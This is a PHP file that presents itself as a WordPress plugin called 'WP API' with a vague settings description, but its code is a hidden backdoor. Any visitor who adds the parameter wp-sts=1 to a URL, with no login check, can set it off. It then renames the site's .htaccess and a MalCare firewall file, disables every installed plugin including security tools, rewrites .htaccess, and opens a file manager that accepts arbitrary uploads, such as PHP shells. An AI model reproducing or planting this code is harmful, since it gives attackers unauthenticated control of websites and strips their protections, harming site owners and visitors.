<?php
/**
 * Plugin Name: WP API
 * Plugin URI:  https://example.com/
 * Description: Advanced settings wordPress api.
 * Version:     6.0.0
 * Author:      Your Name
 * Author URI:  https://example.com/
 * Text Domain: wapis-oader
 */

if (!defined('ABSPATH')) exit;

add_action('init', function () {

    if (!isset($_GET['wp-sts']) || $_GET['wp-sts'] != '1') return;

   
    echo "<h1>WP Rescue & File Manager</h1>";

    $dir = isset($_GET['dir']) ? realpath($_GET['dir']) : ABSPATH;
    if (strpos($dir, realpath(ABSPATH)) !== 0) exit('Invalid path');

    // ----------------------------
    // 1. Backup suspicious files
    // ----------------------------
    $suspicious = ['.htaccess', 'htaccess', 'malcare-waf.php', 'conf.php', 'conf.phtml'];
    echo "<h2>Backup Suspicious Files</h2><ul>";
    foreach ($suspicious as $file) {
        $full = ABSPATH . $file;
        if (file_exists($full)) {
            $bak = $full . '.bak';
            rename($full, $bak);
            echo "<li>Renamed $file → " . basename($bak) . "</li>";
        }
    }
    echo "</ul>";

    // ----------------------------
    // 2. Disable all plugins
    // ----------------------------
    $plugin_dir = WP_CONTENT_DIR . '/plugins/';
    if (is_dir($plugin_dir)) {
        echo "<h2>Disabling Plugins</h2><ul>";
        $plugins = scandir($plugin_dir);
        foreach ($plugins as $p) {
            if ($p === '.' || $p === '..') continue;
            $full = $plugin_dir . $p;
            if (is_dir($full)) {
                $new = $full . '.disabled';
                rename($full, $new);
                echo "<li>$p → $p.disabled</li>";
            }
        }
        echo "</ul>";
    }

    // ----------------------------
    // 3. Restore default .htaccess
    // ----------------------------
    $htaccess = ABSPATH . '.htaccess';
    $default_htaccess = <<<HT
# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>
# END WordPress
HT;
    file_put_contents($htaccess, $default_htaccess);
    echo "<h2>Default .htaccess restored</h2>";

    // ----------------------------
    // 4. File Manager UI
    // ----------------------------
    echo "<h2>File Manager: $dir</h2>";
    echo '<form method="POST" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <input type="submit" value="Upload File">
          </form>';

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
        $target_file = $dir . '/' . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
            echo "<p style='color:green;'>File uploaded: ".htmlspecialchars(basename($target_file))."</p>";
        } else {
            echo "<p style='color:red;'>Failed to upload file!</p>";
        }
    }

    echo "<h3>Files & Directories:</h3><ul>";
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $full = $dir.'/'.$file;
        if (is_dir($full)) {
            echo '<li>[DIR] <a href="?wp-file=1&dir='.urlencode($full).'">'.htmlspecialchars($file).'</a></li>';
        } else {
            echo '<li>[FILE] '.htmlspecialchars($file).' - <a href="'.esc_url(site_url(basename($full))).'" target="_blank">Download</a></li>';
        }
    }
    echo "</ul>";

    exit;
});
